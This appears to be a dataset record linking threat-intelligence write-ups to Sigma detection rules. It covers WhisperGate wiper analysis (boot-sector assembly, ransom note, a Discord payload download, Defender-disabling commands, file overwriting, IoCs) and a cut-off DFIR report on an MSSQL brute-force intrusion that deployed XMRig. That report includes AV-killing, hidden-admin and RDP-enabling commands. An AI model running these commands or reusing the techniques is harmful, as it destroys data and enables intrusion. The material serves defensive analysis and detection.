loc_2:\n      mov ax, cs\n      mov ds, ax\n      mov si, 7C88h      ; 0x7C88 = ransom note offset\n      call $+3\n      push ax\n      cld\n  \n  loc_E:\n      mov al, [si]       ; AL = ransom note offset\n      cmp al, 0\n      jz loc_1A\n      call Write_to_display_sub_1C ; each character\n      inc si\n      jmp short loc_E    ; AL = ransom note offset\n  ; ---------------------------------------------------------------------------\n  loc_1A:\n      jmp short loc_21\n  ; ============= S U B R O U T I N E ==============\n  Write_to_display_sub_1C proc near\n      mov ah, 0Eh       ; - VIDEO - WRITE CHARACTER AND ADVANCE CURSOR (TTY WRITE)\n      int 10h           ; AL = character, BH = display page (alpha modes)\n                        ; BL = foreground color (graphics modes)\n      ret\n  Write_to_display_sub_1C endp\n```\n\n*Writes ransom note on the display*\n\nAfter that, it traverses from the C drive and attempts to destroy it by overwriting it with fixed data as Extended Write mode.\n\n```image\nAlt: Drives wiper code\nDescription: The image displays a snippet of assembly code related to the WhisperGate malware's operation. It includes various instructions and data definitions that illustrate how the malware interacts with the disk, specifically focusing on the Disk Address Packet (DAP) structure and how it manages logical block addressing (LBA) for overwriting sectors on the disk.\nTranscription: |\n  mov     dword ptr ds:7C76h, 7C28h ; Copy ransom note offset to transfer buffer of DAP\n  mov     al, 43h ; 'C'\n  mov     ah, 0 ; Drive index offset\n  mov     dl, 80h ; Drive index (0x80 = CD-ROM)\n  mov     si, 7C72h ;\n  \n  Loc_3F:\n      int     13h\n      jb      short loc_45\n      jnb     short loc_5D\n  \n  Loc_45:\n      inc     byte ptr ds:7C78h ; drive offset += 1\n  \n  Loc_49:\n      mov     dword ptr ds:7C7Ah, 1 ; lower 32-bits of 48-bit starting LBA\n      mov     dword ptr ds:7C7Eh, 0 ; upper 16-bits of 48-bit starting LBA\n      jmp     short loc_21\n  \n  Loc_5D:\n      add     dword ptr ds:7C7Ah, 199 ; + 199 (lower 32-bits of 48-bit starting LBA)\n      add     dword ptr ds:7C7Eh, 0 ; upper 16-bits of 48-bit starting LBA\n      clc\n      jmp     short loc_21\n  \n  ; -------------------------------------------------------------------------\n  db      10h\n  db      0 ; 2 = number of sectors to transfer (max 127 on some BIOSes)\n  dw      0 ; 16bit offset\n  dw      0 ; 8 = lower 32-bits of 48-bit starting LBA\n  dw      12 ; 4 upper 16-bits of 48-bit starting LBA\n  \n  aAaaa:\n      db      'Your hard drive has been corrupted.',0Dh,0Ah\n      db      'In case you want to recover all hard drives',0Dh,0Ah\n      db      'of your organization.',0Dh,0Ah\n      db      'You should pay $5 in bitcoin wallet!',0Dh,0Ah\n      db      '1AVMN6g8jGPCFJeUfkTAwLzngZB6pfv and send message via!',0Dh,0Ah\n      db      'Took ID 8B8CD41C121A33BA47F493B0D1869936A32DAD976FA5D82C1ED23',0\n      db      'with your organization name.',0Dh,0Ah\n      db      'We will contact you to give further instructions.',0\n  dw      0AA55h\n```\n\n*Drives wiper code*\n\nDisk Address Packet (DAP) structure initialized when malicious code writes to disk:\n\n- (0x7C72) (offset 0 size 1): size of packet (16 bytes)\n- (0x7C73) (offset 1 size 1): Reserved (always 0)\n- (0x7C74) (offset 2 size 2): number of sectors to transfer\n- (0x7C76) (offset 4 size 4): transfer buffer (segment:offset)\n- (0x7C7A) (offset 8 size 4): lower 32-bits of 48-bit starting LBA\n- (0x7C7E) (offset 12 size 4): upper 16-bits of 48-bit starting LBA\n\nWrite starts from LBA#1 of disk:\n\n- When disk access is successful, LBA is increased by 0xC7 (199) and written.\n- When disk access fails, increase the Drive Index and try to access the next disk.\n\n```image\nAlt: Overwritten drives\nDescription: The image is a diagram illustrating how the WhisperGate malware overwrites data on different drives (C:, D:, E:) during its attack. It shows a series of logical block addressing (LBA) markers indicating where data is being overwritten. Each drive is represented vertically, with specific LBAs highlighted in red to indicate the points at which the malware writes fixed data (represented as 'AAAAA...') to the drives, emphasizing the destructive nature of the malware's actions across different storage devices.\nTranscription: |\n  C:\\\n  LBA #1\n  ...\n  LBA #200\n  ...\n  LBA #399\n  ...\n  \n  D:\\\n  LBA #1\n  ...\n  LBA #200\n  ...\n  LBA #399\n  ...\n  \n  E:\\\n  LBA #1\n  ...\n  LBA #200\n  ...\n  LBA #399\n  ...\n  AAAAA ...\n```\n\n*Overwritten drives*\n\n### Stage2\n\n- **SHA256**: dcbbae5a1c61dbbbb7dcd6dc5dd1eb1169f5329958d38b58c3fd9384081c9b78\n- **Creation Time**: 2022–01–10 14:39:54\n- **First Submission**: 2022–01–16 20:31:26\n- **File Type**: Win32 EXE\n\nStage2 does not perform malicious actions for 20 seconds to bypass the AV (Anti Virus). To do this, run the following command twice:\n\n> Command: powershell -enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBzACAAMQAwAA==\n> —> Start-Sleep -s 10\n\nThen, it downloads an additional file disguised as a JPG extension from the discord link. The downloaded file is reversed and takes the form of PE, and executes “Ylfwdwgmpilzyaph” method in the file in the memory.\n\n```image\nAlt: Stage3 payload downloaded via Discord link\nDescription: The image displays a code snippet related to malware behavior, specifically focusing on the downloading process through a Discord link. It contains lines of code that manipulate arrays, check conditions, and perform operations associated with the malware's functionality. This snippet provides insight into the coding techniques used in the WhisperGate malware, which adds value to the analysis by illustrating how the malware attempts to download malicious payloads.\nTranscription: |\n  byte[] array = (byte[])Facade.UpdateItem(typeof(WebClient).GetMethod(\"DxownxlxoadDxatxxax\".Replace(\"x\", \"\"), new Type[]\n  {\n      Facade.MoveItem(typeof(string).TypeHandle\n  }), new WebClient(), new object[]\n  {\n      \"https://cdn.discordapp.com/attachments/928503440139771947/930108637681184768/Tbopbh.jpg\"\n  });\n  IL_9F:\n  bool flag = array.Length > 1;\n  IL_A8:\n  if (!flag)\n      goto IL_B8;\n  IL_AC:\n  Facade.Array.Reverse(array, 0, array.Length);\n```\n\n*Stage3 payload downloaded via Discord link*\n\n- **URL**: https[:]//cdn.discordapp[.]com/attachments/928503440139771947/930108637681184768/Tbopbh.jpg\n\n### Stage3 (Tbopbh.jpg)\n\n- **SHA256**: 923eb77b3c9e11d6c56052318c119c1a22d11ab71675e6b95d05eeb73d1accd6\n\n**Tbopbh.jpg (Reversed)**\n\n- **SHA256**: 9ef7dbd3da51332a78eff19146d21c82957821e464e8133e9594a07d716d892d\n- **Creation Time**: 2022–01–10 14:39:31\n- **First Submission**: 2022–01–16 21:29:58\n- **File Type**: Win32 DLL\n\nThe downloaded Stage3 is written in C# as in Stage2, and an obfuscation tool called **Eazfuscator** is detected by exeinfoPE.\n\n```image\nAlt: Detected Eazfuscator\nDescription: The image is a screenshot of a DLL analysis tool displaying details about a DLL file named 'sample3_reversed.txt'. It includes technical information such as the entry point, file offset, linker info, file size, and the subsystem. The interface shows specific bytes, section names, and mentions Eazfuscator.NET, indicating that the file has been obfuscated. The background features a light blue gradient, enhancing the readability of the text displayed.\nTranscription: |\n  File : sample3_reversed.txt\n  Entry Point : 00045DA6\n  EP Section : .text\n  File Offset : 00043FA6\n  First Bytes : FF.25.00.20.40\n  Linker Info : 6.00\n  File Size : 00044600h\n  Subsystem : Win Console\n  Overlay : NO 00000000\n  \n  DLL - Library image\n  RES/OVL : 0 / 0 % 2022\n  Eazfuscator.NET v2020.2.x [ No Runtime ] - (c) 2008-2020 - www.gap\n  Lamer Info - Help Hint - Unpack info\n  Big sec. 1.text , .NET obf,/License protector Unpack with : de4dot v3\n```\n\n*Detected Eazfuscator*\n\nThere are 3 resources inside Stage3, and except for the resource “**78c855a088924e92a7f60d661c3d1845‎**”, the use of the remaining 2 resources has not yet been confirmed, and the contents will be updated later.\n\n```image\nAlt: 3 resources inside Stage3\nDescription: The image displays a code snippet or interface from a software tool used for analyzing a DLL file. It shows the structure of a DLL named 'Frkmlkdkdubkznbkcf.dll', including its version (1.0.0.0) and two listed resources identified by their SHA256 hashes ('78c855a088924e92a7f60d661c3d1845' and '7c8cb5598e724d34384cce7402b11f0e'). This indicates that the image contains technical data relevant to malware analysis.\nTranscription: |\n  Frkmlkdkdubkznbkcf (1.0.0.0)\n    Frkmlkdkdubkznbkcf.dll\n      PE\n      References\n      Resources\n        78c855a088924e92a7f60d661c3d1845\n        7c8cb5598e724d34384cce7402b11f0e\n```\n\n*3 resources inside Stage3*\n\nStage3 loads “78c855a088924e92a7f60d661c3d1845‎” resource inside and performs decoding by XOR operation.\n\n```image\nAlt: XOR decoding code\nDescription: The image displays a snippet of C# code related to malware functionality. It includes variable declarations, a loop, and XOR operations, which are typically used for obfuscation or encoding data in malware analysis. The code snippet demonstrates how certain byte arrays are manipulated, likely as part of the malware's execution or decoding process.\nTranscription: |\n  private static byte[] #u0002(byte[] #u0002) {\n      string s = #u00OF#u2004#u2000(-1506769664);\n      byte[] u = Convert.FromBase64String(s);\n      #u0003#u2004#u2000(u);\n      byte[] u2 = new byte[#u0000#u0002.Length];\n      int num = #u0002.Length;\n      byte b = 0;\n      byte b2 = 121;\n      byte[] array = new byte[] {\n          148,\n          68,\n          208,\n          52,\n          241,\n          93,\n          195,\n          220\n      };\n      for (int num2 = 0; num2 != num; num2++) {\n          if (b == 0) {\n              b2 = u2.#u0002();\n          }\n          b += 1;\n          if (b == 32) {\n              b = 0;\n          }\n          int num3 = num2;\n          #u0002[num3] = (b2 ^ array[num2 >> 2 & 3]);\n      }\n      return #u0002;\n  }\n```\n\n*XOR decoding code*\n\nNext, the decoded data is a DLL file and contains two additional resources. The two resources “AdvancedRun” and “Waqybg”, are extracted by Stage3, and decompressed with GZIP.\n\n- **AdvancedRun (GZIP Decompressed)**\n- **Waqybg (Reversed and GZIP Decompressed)**\n\n```image\nAlt: 2 resources in the decoded resource\nDescription: The image shows a code analysis interface displaying the structure of a .dll file named 'zx_fee6cce9db1d42510801f1c1ed0e09452.dll'. It includes sections labeled 'PE' (Portable Executable), 'References', and 'Resources'. Under the 'Resources' section, there are two entries: 'AdvancedRun' and 'Waqybg', which are likely components of the malware described in the context. The image presents a detailed view of the internal structure of the DLL, which is relevant for understanding the malware's functionality.\nTranscription: |\n  zx_fee6cce9db1d42510801fc1ed0e09452.dll\n  - PE\n  - References\n  - Resources\n    - ClassLibrary1.Properties.Resources.resources\n      - AdvancedRun\n      - Waqybg\n    - {}\n      - <Module> @02000001\n        - Base Type and Interfaces\n        - Derived Types\n```\n\n*2 resources in the decoded resource*\n\n1. **AdvancedRun**: Stop Windows Defender service\n\n   - Execute “%Temp%Nmddfrqqrbyjeygggda.vbs” to specify “C:\\” as the exception folder.\n\n     > Command: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe” Set-MpPreference -ExclusionPath ‘C:\\’\n\n   - Stop Windows Defender service through AdvancedRun.exe and delete “C:\\ProgramData\\Microsoft\\Windows Defender” directory.\n\n     > Command: “C:\\Users\\Administrator\\AppData\\Local\\Temp\\AdvancedRun.exe” /EXEFilename “C:\\Windows\\System32\\sc.exe” /WindowState 0 /CommandLine “stop WinDefend” /StartDirectory “” /RunAs 8 /Run\n     > Command: “C:\\Users\\Administrator\\AppData\\Local\\Temp\\AdvancedRun.exe” /EXEFilename “C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe” /WindowState 0 /CommandLine “rmdir ‘C:\\ProgramData\\Microsoft\\Windows Defender’ -Recurse” /StartDirectory “” /RunAs 8 /Run\n\n2. **Waqybg**: Overwrites target files\n\n   - Overwrites the 0x100000 (1MB) of the file with 0xCC.\n   - **Extension**: Random number\n\n```image\nAlt: Overwrites files\nDescription: The image features a snippet of code, presumably written in C, that showcases memory allocation and file handling operations. It utilizes functions such as 'malloc' for memory allocation, 'fwopen' for opening a file in binary write mode, and 'fwrite' for writing data to the file. The code seems to be part of a larger malware analysis, possibly related to the manipulation of file names and memory management within the context of malware behavior.\nTranscription: |\n  v1 = wcslen(FileName);\n  v2 = (wchar_t *)malloc(2 * (v1 + 20));\n  v3 = rand();\n  v4 = wcslen(FileName);\n  swprintf(v2, (const size_t)\"%\", (const wchar_t *const)(v4 - 4), FileName, v3);\n  Stream = wfopen(FileName, L\"wb\");\n  v5 = malloc(0x100000u);\n  memset(v5, 204, 0x100000u);\n  fwrite(v5, 1u, 0x100000u, Stream);\n  fclose(Stream);\n  wrename(FileName, v2);\n  free(v2);\n  free(v5);\n```\n\n*Overwrites files*\n\n- **Target file extensions (106)**:\n\n  ```\n  .HTML .HTM .PHTML .PHP .JSP .ASP .PHPS .PHP5 .ASPX .PHP4 .PHP3 .DOC .DOCX .XLS .XLSX .PPT .PPTX .PST .MSG .EML .TXT .CSV .RTF .WKS .WK1 .PDF .DWG .JPEG .JPG .DOCM .DOT .DOTM .XLSM .XLSB .XLW .XLT .XLM .XLC .XLTX .XLTM .PPTM .POT .PPS .PPSM .PPSX .HWP .SXI .STI .SLDX .SLDM .BMP .PNG .GIF .RAW .TIF .TIFF .PSD .SVG .CLASS .JAR .SCH .VBS .BAT .CMD .ASM .PAS .CPP .SXM .STD .SXD .ODP .WB2 .SLK .DIF .STC .SXC .ODS .3DM .MAX .3DS .STW .SXW .ODT .PEM .P12 .CSR .CRT .KEY .PFX .DER .OGG .JAVA .INC .INI .PPK .LOG .VDI .VMDK .VHD .MDF .MYI .MYD .FRM .SAV .ODB .DBF .MDB .ACCDB .SQL .SQLITEDB .SQLITE3 .LDF .ARC .BAK .TAR .TGZ .RAR .ZIP .BACKUP .ISO .CONFIG\n  ```\n\n- Executes ping command and delete itself:\n\n  > cmd.exe /min /C ping 111.111.111.111 -n 5 -w 10 > Nul & Del /f /q \\”[Filepath]\\”\n\n## Appendix\n\n### Ransom Note\n\n```\nYour hard drive has been corrupted.\nIn case you want to recover all hard drives\nof your organization,\nYou should pay us $10k via bitcoin wallet\n1AVNM68gj6PGPFcJuftKATa4WLnzg8fpfv and send message via\ntox ID 8BEDC411012A33BA34F49130D0F186993C6A32DAD8976F6A5D82C1ED23054C057ECED5496F65\nwith your organization name.\nWe will contact you to give further instructions.\n```\n\n### Related IoCs\n\n- **a196c6b8ffcb97ffb276d04f354696e2391311db3841ae16c8c9f56f36a38e92** (Stage1)\n- **dcbbae5a1c61dbbbb7dcd6dc5dd1eb1169f5329958d38b58c3fd9384081c9b78** (Stage2)\n- **923eb77b3c9e11d6c56052318c119c1a22d11ab71675e6b95d05eeb73d1accd6** (Stage3, Tbopbh.jpg)\n- **9ef7dbd3da51332a78eff19146d21c82957821e464e8133e9594a07d716d892d** (Stage3, *Reversed* Tbopbh.jpg)\n- **35FEEFE6BD2B982CB1A5D4C1D094E8665C51752D0A6F7E3CAE546D770C280F3A** (Decoded Resource “78c855a088924e92a7f60d661c3d1845‎”)\n- **29AE7B30ED8394C509C561F6117EA671EC412DA50D435099756BBB257FAFB10B** (AdvancedRun.exe)\n- **DB5A204A34969F60FE4A653F51D64EEE024DBF018EDEA334E8B3DF780EDA846F** (Nmddfrqqrbyjeygggda.vbs)\n- **34CA75A8C190F20B8A7596AFEB255F2228CB2467BD210B2637965B61AC7EA907** (File Wiper)\n- **URL**: https[:]//cdn.discordapp[.]com/attachments/928503440139771947/930108637681184768/Tbopbh.jpg\n\n## Reference\n\n- https://www.microsoft.com/security/blog/2022/01/15/destructive-malware-targeting-ukrainian-organizations/",
    "sigma_rule": {
      "title": "PUA - AdvancedRun Suspicious Execution",
      "id": "fa00b701-44c6-4679-994d-5a18afa8a707",
      "related": [
        {
          "id": "d2b749ee-4225-417e-b20e-a8d2193cbb84",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects the execution of AdvancedRun utility in the context of the TrustedInstaller, SYSTEM, Local Service or Network Service accounts",
      "references": [
        "https://twitter.com/splinter_code/status/1483815103279603714",
        "https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3",
        "https://www.elastic.co/security-labs/operation-bleeding-bear",
        "https://www.winhelponline.com/blog/run-program-as-system-localsystem-account-windows/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-01-20",
      "modified": "2023-02-21",
      "tags": [
        "attack.defense-evasion",
        "attack.privilege-escalation",
        "attack.t1134.002"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": [
            "/EXEFilename",
            "/CommandLine"
          ]
        },
        "selection_runas": [
          {
            "CommandLine|contains": [
              " /RunAs 8 ",
              " /RunAs 4 ",
              " /RunAs 10 ",
              " /RunAs 11 "
            ]
          },
          {
            "CommandLine|endswith": [
              "/RunAs 8",
              "/RunAs 4",
              "/RunAs 10",
              "/RunAs 11"
            ]
          }
        ],
        "condition": "all of selection*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_pua_advancedrun_priv_user.yml",
    "id": "383"
  },
  {
    "url": "https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/",
    "markdown": "# SELECT XMRig FROM SQLServer\n\n**Categories:** coinminer, exploit \n**Published Date:** July 11, 2022 \n\n---\n\nIn March 2022, we observed an intrusion on a public-facing Microsoft SQL Server. The end goal of this intrusion was to deploy a coin miner. Although deploying a coin miner on a vulnerable server after successful exploitation is a common objective for threat actors, this intrusion was slightly different and therefore more interesting.\n\nUS CERT recently published a malware analysis report related to XMRig coin miner on 23rd June 2022 (link) and a security tip for defending against this threat (link).\n\n---\n\n## Summary\n\nOver the month of March, we observed a cluster of activity targeting MSSQL servers. The activity started via password brute force attempts for the MSSQL SA account. These brute force attempts were observed repeatedly over the month. Examples included one cluster of 24,000 failed attempts from the same source, over a 27-hour effort, before they finally managed to guess the password. After obtaining the correct credentials, the attackers spawned a command shell via `xp_cmdshell`. According to Microsoft documentation, `xp_cmdshell` spawns a Windows command shell and passes in a string for execution.\n\nUsing `xp_cmdshell`, the threat actors were able to execute any command against the compromised server. They attempted to kill a bunch of AV programs by using `taskkill.exe`. The threat actors then wrote multiple commands to a batch file by using `echo` and redirecting the strings to a file named `1.bat`. After the batch file was written, they proceeded to perform the same action echoing data into a file named `bigfile.txt`. After finishing writing to that file, they ran `certutil` to decode the base64 data into an executable file. This executable was a privilege escalation tool used to execute the batch file to ensure it executed with high enough permissions. They then executed the batch script. The commands included adding new users to the local administrators group, enabling RDP, enabling WDigest, and hiding the newly created admin accounts using the registry.\n\nOnce the threat actors had established persistence on the compromised host, they moved to their final objective, which was to install and run the XMRig miner. They dropped a Binary Managed Object Format (BMOF) file along with the miner itself to achieve this. The threat actors used `mofcomp.exe` to decompile the BMOF binary and register a malicious class in the WMI repository. The event consumer of the newly created classes included a VBE script responsible for setting up and executing the XMRig miner with the correct settings.\n\nNo other activity beyond the mining was observed before the threat actors were evicted.\n\n---\n\n## Services\n\nWe offer multiple services, including a Threat Feed service that tracks Command and Control frameworks such as Cobalt Strike, Sliver, BumbleBee, Covenant, Metasploit, Empire, PoshC2, etc. More information on this service and others can be found here.\n\nArtifacts for this case are limited due to the environment. A few log sources are available for this case under our Security Researcher and Organization services.\n\n---\n\n## Initial Access\n\nThe initial access took place via a brute-force attack, where the threat actors mainly targeted the System Admin (SA) account.\n\nDuring the intrusions, we could see SQL Server event ID **18456** Failure Audit Events in the Windows application logs. We witnessed more than 24,000 attempts from the same source before the threat actors successfully guessed the username and password for the open SQL database.\n\n### Example of the failed brute force attempts:\n\n```image\nAlt: Failed Attempts\nDescription: The image displays a series of failed login attempts to a SQL Server, showing usernames and the corresponding reasons for failure. Each entry indicates whether the password did not match or the login could not be found. The usernames include common administrative names like 'sa' and 'admin,' highlighting potential brute force attack attempts.\nTranscription: |\n  sa | Reason: Password did not match that for the login provided. |\n  hbv7 | Reason: Could not find a login matching the name provided. |\n  su | Reason: Could not find a login matching the name provided. |\n  ps | Reason: Could not find a login matching the name provided. |\n  vice | Reason: Could not find a login matching the name provided. |\n  kisadmin | Reason: Could not find a login matching the name provided. |\n  401hk | Reason: Could not find a login matching the name provided. |\n  sysdba | Reason: Could not find a login matching the name provided. |\n  admin | Reason: Password did not match that for the login provided. |\n  uep | Reason: Could not find a login matching the name provided. |\n  bizbox | Reason: Could not find a login matching the name provided. |\n  neterp | Reason: Could not find a login matching the name provided. |\n  unierp | Reason: Could not find a login matching the name provided. |\n  sp | Reason: Could not find a login matching the name provided. |\n  root | Reason: Password did not match that for the login provided. |\n  bwsa | Reason: Could not find a login matching the name provided. |\n```\n\n### Followed by eventual successful logins:\n\n```image\nAlt: Successful Logins\nDescription: The image depicts a table displaying SQL Server audit events. It includes columns such as 'TimeWritten,' 'EventID,' 'EventTypeName,' 'EventCategory,' 'SourceName,' and 'Strings,' showing multiple entries for successful audit events. The entries indicate the timestamps of the events, the event type as 'Success Audit event,' and the source name as 'MSSQL$SQLEXPRESS,' suggesting automated access attempts by the threat actor.\nTranscription: |\n  | TimeWritten      | EventID | EventT | EventTypeName       | EventC | SourceName       | Strings       |\n  | ---------------- | ------- | ------ | ------------------- | ------ | ---------------- | ------------- |\n  | 2022-11-01 11:00 | 18454   | 8      | Success Audit event | 4      | MSSQL$SQLEXPRESS | sa | [CLIENT: |\n  | 2022-11-01 11:00 | 18454   | 8      | Success Audit event | 4      | MSSQL$SQLEXPRESS | sa | [CLIENT: |\n  | 2022-11-01 11:01 | 18454   | 8      | Success Audit event | 4      | MSSQL$SQLEXPRESS | sa | [CLIENT: |\n```\n\nIt is likely that multiple successful logins were observed due to the automated access script that the threat actor was using.\n\n---\n\n## Execution\n\nIn the next attack stage, the threat actors established a cmd shell via Extended SQL Stored Procedure (`xp_cmdshell`). This process allows you to issue operating system commands directly to the Windows command shell using T-SQL code.\n\n### Example of command execution following a successful authentication to SQL database using `xp_cmdshell`:\n\n```\nEXEC xp_cmdshell 'whoami'\n```\n\nAt a high level, the overall execution events can be depicted in the below diagram:\n\n```image\nAlt: Execution Diagram\nDescription: The image is a flow diagram illustrating the execution events following a successful brute-force attack against a SQL Server. It details the steps from authentication via brute force, the use of the command shell via `xp_cmdshell`, writing various scripts and files to disk, compiling a MOF file, and killing antivirus processes. The diagram includes visual elements like boxes and arrows showing the progression of actions taken by threat actors, such as adding local administrator accounts and setting up a scheduled task for running XMRig CoinMiner.\nTranscription: |\n  START\n    Brute-Force Attack Against SQL Server\n      Successful Authentication via Brute Force Attack\n        Command Shell via xp_cmdshell\n          Writes 1.bat, and bigfile.txt to disk\n            decodes bigfile.txt with certutil into bigfile.exe\n              bigfile.exe used to run 1.bat\n                1.bat performs the following\n                  Adding Local Administrator Accounts\n                  Hiding New Local Admin Accounts\n                  Enables RDP\n                  Enables Widget\n          Writes kit.bat to disk\n            Running XMRig CoinMiner\n              Creating scheduled task for CoinMiner\n      Compiling BMOF file\n        Adding a new class/ MyASEventConsumer in WMI repository\n          EventConsumer (Script or executable to run)\n            Creates persistence\n            Download/executes VBE script\n              - Random Name\n              - Executes every day at 23:00\n          EventFilter (Trigger condition)\n          Binding (Tie together Filter + Consumer)\n    Kills AV Processes\n```\n\nIf we look into the Windows Application logs, specifically, the SQL Server event ID 15457 captures this as an `xp_cmdshell` event. Additionally, the SQL Server audit collection also captures similar events. The first commands executed by the threat actors included using `taskkill` for various anti-virus software.\n\n### Commands to kill AV processes:\n\n```\ntaskkill /f /im egui.exe\ntaskkill /f /im QQPCTray.exe\ntaskkill /f /im SafeDogGuardCenter.exe\ntaskkill /f /im 360safe.exe\ntaskkill /f /im net1895.exe\ntaskkill /f /im ekrn.exe\ntaskkill /f /im 360rp.exe\ntaskkill /f /im QQPCMgr.exe\ntaskkill /f /im SafeDogServerUI.exe\ntaskkill /f /im SafeDogSiteIIS.exe\n```\n\nThe threat actors also favored the execution of batch scripts on the compromised host. They used `xp_cmdshell` to write a batch script (`1.bat`) to disk by redirecting strings to the file using `echo` commands.\n\n```image\nAlt: Batch Script Creation\nDescription: The image displays a table detailing a process execution log from a cybersecurity incident. It includes columns for 'Initiating Process File Name', 'Action Type', 'Initiating Process Command Line', 'Initiating Process Account Name', and 'File Name'. The table shows that 'cmd.exe' initiated a file creation action, specifically creating a batch file named '1.bat'. The command line executed involves various administrative commands, such as adding a user to local groups and modifying registry entries.\nTranscription: |\n  | Initiating Process File Name | Action Type | Initiating Process Command Line| Initiating Process Account Name | File Name |\n  | ---------------------------- | ----------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------- | --------- |\n  | cmd.exe                      | FileCreated | \"cmd.exe\" /c (echo NET USER Admin\\$ !67hC5140Rvg /ADD /expires:never & echo NET LOCALGROUP Administrators /ADD Admin\\$ & REG ADD \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v SpecialAccounts\\Userlist /t REG_DWORD /d 0 & echo reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\" /v UseLogonCredential /t REG_DWORD /d 1 /f & echo reg add \"HKLM\\LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v UserAuthentication /t REG_DWORD /d 0 /f & echo reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-TCP\" /v UserAuthentication /t REG_DWORD /d 0 /f & echo NET LOCALGROUP Administrators /ADD Admin\\$ & echo NET LOCALGROUP Administrators /ADD Admin\\$ > %USERPROFILE%\\AppData\\1.bat | mssql$sqlexpress                | 1.bat     |\n```\n\nA second set of commands was also echoed into a file named `bigfile.txt`. Once complete, `certutil` was used to decode the text and create an executable file.\n\n### Certutil command:\n\n```\ncmd.exe /c certutil -decode %USERPROFILE%\\AppData\\bigfile.txt %USERPROFILE%\\AppData\\bigfile.exe\n```\n\nThis executable was then used in executing the `1.bat` batch file.\n\n### Command to execute batch file:\n\n```\ncmd.exe /c %USERPROFILE%\\AppData\\bigfile.exe -i -c %USERPROFILE%\\AppData\\1.bat\n```\n\nPulling the hash of the file that was written matches what appears to be a privilege escalation tool as seen in the hits from THOR scanner: \nhttps://www.virustotal.com/gui/file/b67dfd4a818d10a017a4d32386cf4cd2a3974636bed04f27e45de6ada86a56d2/community\n\n```image\nAlt: THOR Scanner\nDescription: The image displays a screenshot from the THOR APT Scanner, detailing YARA signature matches for various hacking tools and indicators. It includes specific rules like 'Hacktool_Inject_Incognito' and 'Hacktool_Privilege_Escalation_Jan22_1,' with links to their descriptions and detection information. Detection timestamps and AV detection rates (e.g., 8/67) are also provided, indicating the effectiveness of the rules in identifying malicious activity.\nTranscription: |\n  thor\n  1 month ago\n  \n  YARA Signature Match - THOR APT Scanner\n  \n  RULE: Hacktool_Inject_Incognito\n  RULE_SET: Livehunt - Hacktools Indicators ⚔️\n  RULE_TYPE: VALHALLA rule feed only\n  RULE_LINK: https://valhalla.nextron-systems.com/info/rule/Hacktool_Inject_Incognito\n  DESCRIPTION: Detects hacktool incognito\n  RULE_AUTHOR: Florian Roth\n  \n  Detection Timestamp: 2022-06-07 23:44\n  AV Detection Ratio: 6 / 67\n  \n  Use these tags to search for similar matches: #hacktool #incognito #hacktool_inject_incognito\n  More information: https://www.nextron-systems.com/notes-on-virustotal-matches/\n  \n  ---\n  \n  thor\n  1 month ago\n  \n  YARA Signature Match - THOR APT Scanner\n  \n  RULE: Hacktool_Incognito_av\n  RULE_SET: Livehunt - Hacktools Indicators ⚔️\n  RULE_TYPE: VALHALLA rule feed only\n  RULE_LINK: https://valhalla.nextron-systems.com/info/rule/Hacktool_Incognito_av\n  DESCRIPTION: Detects Hacktool Incognito Av\n  REFERENCE: https://www.virustotal.com/en/file/18e64d4c240f6481e7bd542f6c8acc802549d437ec0018e10a3b0b6f675d/analysis/\n  RULE_AUTHOR: Florian Roth\n  \n  Detection Timestamp: 2022-06-07 23:44\n  AV Detection Ratio: 8 / 67\n  \n  Use these tags to search for similar matches: #hacktool #incognito #hacktool_incognito_av\n  More information: https://www.nextron-systems.com/notes-on-virustotal-matches/\n  \n  ---\n  \n  thor\n  1 month ago\n  \n  YARA Signature Match - THOR APT Scanner\n  \n  RULE: HKTK_Inject_Privilege_Escalation_Jan22_1\n  RULE_SET: Livehunt - Hacktools Indicators ⚔️\n  RULE_TYPE: VALHALLA rule feed only\n  RULE_LINK: https://valhalla.nextron-systems.com/info/rule/HKTK_Inject_Privilege_Escalation_Jan22_1\n  DESCRIPTION: Detects a hacktool that seems to provide privilege escalation vectors\n  RULE_AUTHOR: Florian Roth\n  \n  👋 Hey, this seems to be an open-source tool or framework. The author has shared it with the community with the intention to improve overall security. If you are a victim and noticed this tool in a breach, please visit the tool's github page (see above) and tell your story by creating an issue on the issues page: https://github.com/KaLendis/CVE-2022-21882/issues ❤️.\n  \n  Detection Timestamp: 2022-06-07 23:44\n  AV Detection Ratio: 6 / 67\n```\n\nWe believe this tool may be a variation of NetworkServiceExploit.exe, which attempts to use NetworkService for privilege escalation.\n\n---\n\n## Persistence\n\nThe threat actors wrote a batch script (`1.bat`) that contained commands for establishing persistence on the compromised host. We see the creation of a new account and adding this account to the local administrators group.\n\n### Commands to create and add user:\n```\nNET USER Adminv$ !67hCS14ORVg /ADD /expires:never\nNET LOCALGROUP Administrators /ADD Adminv$\n```\n\nThey also made remote RDP connections possible by changing the `fDenyTSConnections` and `UserAuthentication` values to `0`.\n\n### Commands to enable RDP:\n```\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-TCP\" /v UserAuthentication /t REG_DWORD /d \"0\" 